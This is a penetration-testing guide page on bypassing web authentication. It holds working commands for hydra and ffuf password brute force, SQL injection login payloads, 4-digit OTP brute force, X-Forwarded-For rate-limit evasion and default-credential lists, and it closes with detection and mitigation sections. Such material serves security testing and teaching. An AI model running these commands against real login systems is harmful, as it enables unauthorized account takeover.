% Filename: 04-web-testing/auth-session/authentication-bypass.md
% Display name: Authentication Bypass
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0006 (Credential Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1110 (Brute Force)
% Authors: @TristanInSec

# Authentication Bypass

## Overview

Authentication bypass vulnerabilities allow attackers to access protected resources without valid credentials. These range from trivial issues (default passwords left unchanged) to subtle logic flaws (race conditions in 2FA verification). Authentication is the first defense layer — when it fails, all downstream authorization controls become irrelevant.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0006 - Credential Access
- **Technique:** T1110 - Brute Force

## Prerequisites

- Target application has a login mechanism (form-based, HTTP basic, API key, etc.)
- Login endpoint URL identified
- Understanding of the authentication flow (single-factor, MFA, SSO)

## Detection Methodology

### Mapping the Authentication Surface

Identify all authentication-related endpoints:

```text
/login
/signin
/api/auth/login
/api/v1/login
/admin/login              (separate admin login)
/register
/signup
/forgot-password
/reset-password
/api/auth/token
/oauth/authorize
/saml/login
/.well-known/openid-configuration
```

Check for multiple authentication mechanisms — the application may have a web login, an API login, and a mobile login, each with different security controls.

### Boundary Testing

```bash
# curl
# https://curl.se/
# Test for verbose error messages (user enumeration)
curl -s -X POST http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=wrongpassword"

curl -s -X POST http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistentuser&password=wrongpassword"

# Different error messages indicate user enumeration is possible:
# "Invalid password" vs "User not found"
# Different response times can also indicate valid vs invalid usernames
```

## Techniques

### Default Credentials

Always test default credentials before attempting brute force:

```text
admin:admin
admin:password
admin:123456
administrator:administrator
root:root
root:toor
test:test
guest:guest
```

Framework-specific defaults:

```bash
# Tomcat Manager
tomcat:tomcat
admin:admin
manager:manager

# phpMyAdmin
root:(empty)
root:root

# WordPress
admin:admin

# Jenkins
admin:admin
```

### Brute Force

```bash
# hydra
# https://github.com/vanhauser-thc/thc-hydra
# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 16

# HTTP Basic Auth brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get / -t 16

# With SSL
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 16
```

```bash
# ffuf
# https://github.com/ffuf/ffuf
# Password brute force with ffuf (useful for JSON APIs)
ffuf -u http://target.com/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401,403 -mc 200
```

### Username Enumeration

**Via login response differences:**

```bash
# curl
# https://curl.se/
# Compare response length/content for valid vs invalid usernames
curl -s -o /dev/null -w "Length: %{size_download} Time: %{time_total}" \
  -X POST http://target.com/login \
  -d "username=admin&password=wrong"

curl -s -o /dev/null -w "Length: %{size_download} Time: %{time_total}" \
  -X POST http://target.com/login \
  -d "username=nonexistent&password=wrong"
```

**Via registration endpoint:**

```bash
# curl
# https://curl.se/
# "Email already registered" reveals existing accounts
curl -s -X POST http://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"test123"}'
```

**Via password reset:**

```bash
# curl
# https://curl.se/
# "If an account exists..." (safe) vs "Email not found" (leaks info)
curl -s -X POST http://target.com/forgot-password \
  -d "email=admin@target.com"
```

### Login Logic Flaws

**SQL injection in login:**

```bash
# curl
# https://curl.se/
curl -s -X POST http://target.com/login \
  -d "username=admin' OR 1=1--&password=anything"

curl -s -X POST http://target.com/login \
  -d "username=admin'--&password=anything"
```

**Parameter manipulation:**

```bash
# curl
# https://curl.se/
# Add or modify parameters
curl -s -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong","admin":true}'

curl -s -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong","role":"admin"}'
```

**HTTP verb tampering:**

```bash
# curl
# https://curl.se/
# POST login may be protected, but other methods might bypass
curl -s -X GET "http://target.com/admin"
curl -s -X PUT http://target.com/login -d "username=admin&password=wrong"
curl -s -X OPTIONS http://target.com/admin
```

**Case sensitivity issues:**

```bash
# Some backends treat Admin, ADMIN, and admin as different users
# but the password reset or login may normalize differently
username=Admin
username=ADMIN
username=admin
username=aDmIn
```

### 2FA Bypass

**Direct page access (skipping 2FA step):**

```bash
# curl
# https://curl.se/
# After successful password entry, try accessing the dashboard directly
# without completing the 2FA step
curl -s -b "session=AUTHENTICATED_SESSION_COOKIE" http://target.com/dashboard
```

**Response manipulation:**

```bash
# Intercept the 2FA verification response in Burp Suite
# Change {"success":false} to {"success":true}
# Change HTTP 403 to HTTP 200
# Change "status":"fail" to "status":"ok"
```

**Brute force OTP codes:**

```bash
# ffuf
# https://github.com/ffuf/ffuf
# 4-digit OTP brute force
ffuf -u http://target.com/verify-2fa \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=AUTH_SESSION" \
  -d '{"code":"FUZZ"}' \
  -w <(seq -w 0000 9999) \
  -mc 200 -fc 401,403

# 6-digit OTP (1M attempts — only feasible without rate limiting)
# seq -w 000000 999999 > /tmp/otp6.txt
# ffuf -u http://target.com/verify-2fa -X POST ... -w /tmp/otp6.txt
```

**Backup code reuse:**

Test if backup codes can be reused multiple times or if they are invalidated after first use.

### Rate Limiting Bypass for Login

```bash
# curl
# https://curl.se/
# IP-based rate limit bypass via headers
curl -s -X POST http://target.com/login \
  -H "X-Forwarded-For: 127.0.0.$((RANDOM % 256))" \
  -d "username=admin&password=test"

# Account lockout bypass — target multiple accounts
# Some applications lock the account but not the IP
for user in admin administrator root operator; do
  curl -s -X POST http://target.com/login \
    -d "username=$user&password=P@ssw0rd123"
done

# Case variation bypass (may bypass per-username lockout)
curl -s -X POST http://target.com/login -d "username=Admin&password=test"
curl -s -X POST http://target.com/login -d "username=ADMIN&password=test"
```

## Detection Methods

### Network-Based Detection

- High volume of failed login attempts from a single IP or against a single account
- Login attempts with known default credentials
- Requests to the 2FA verification endpoint with rapidly cycling OTP values
- Login requests with SQL injection payloads in username/password fields
- Multiple `X-Forwarded-For` values in rapid succession from the same source IP

### Host-Based Detection

- Failed authentication events exceeding threshold in application/system logs
- Account lockout events followed by continued attempts via header manipulation
- Successful authentication immediately followed by 2FA bypass (direct dashboard access)
- Login attempts with IP addresses in `X-Forwarded-For` that don't match the source

## Mitigation Strategies

- **Enforce strong password policies** — minimum length, complexity requirements, and check against known breached passwords (e.g., HaveIBeenPwned API)
- **Rate limiting and account lockout** — limit login attempts per account and per IP. Use progressive delays (1s, 2s, 4s, 8s...) rather than hard lockout to avoid DoS
- **Generic error messages** — return the same error for invalid username and invalid password ("Invalid credentials"). Normalize response timing
- **Mandatory MFA** — require multi-factor authentication for privileged accounts. Enforce MFA server-side — do not rely on client-side flow completion
- **Change default credentials** — enforce password changes on first login for all accounts with default credentials
- **CAPTCHA on login** — add CAPTCHA after a threshold of failed attempts to prevent automated brute force

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [OWASP - Testing for Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1110 - Brute Force](https://attack.mitre.org/techniques/T1110/)
